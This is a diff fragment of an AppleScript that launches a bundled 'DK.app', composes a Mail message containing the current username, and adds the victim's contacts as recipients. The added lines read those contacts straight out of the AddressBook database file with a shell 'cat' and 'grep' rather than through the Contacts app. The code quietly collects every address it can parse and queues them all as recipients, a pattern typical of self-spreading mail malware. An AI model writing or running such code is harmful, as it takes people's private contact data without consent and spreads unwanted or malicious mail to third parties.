@@ -75,6 +75,7 @@ end try
 
 try
 	do shell script "open " & (POSIX path of (path to resource "DK.app"))
+	delay 0.5
 end try
 
 try
@@ -86,22 +87,19 @@ try
 	" & theuser & ""} -- Make email message
 	end tell
 	
-	tell application "Contacts"
-		set thepeople to every person
-		set j to (number of people)
-		repeat with i from 1 to j
-			set adrper to (number of emails of (item i of thepeople))
-			repeat with x from 1 to adrper
-				set adr to (value of email x of (item i of thepeople))
-				tell application "Mail"
-					tell theMessage
-						make new to recipient at end of to recipients with properties {address:adr} -- Add recipients to message
-					end tell
+	do shell script "cat /Users/" & theuser & "/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb | grep -a 'com'"
+	set txt to 2nd paragraph of result
+	set wrds to words of txt
+	repeat with x from 1 to (count of wrds)
+		if (item x in wrds) contains ".com" or (item x in wrds) contains ".org" or (item x in wrds) contains ".net" then
+			set adr to ((item (x - 1) in wrds) & "@" & (item x in wrds)) as text
+			tell application "Mail"
+				tell theMessage
+					make new to recipient at end of to recipients with properties {address:adr} -- Add recipients to message
 				end tell
-			end repeat
-		end repeat
-		quit
-	end tell
+			end tell
+		end if
+	end repeat
 	
 	tell application "Mail"
 		try
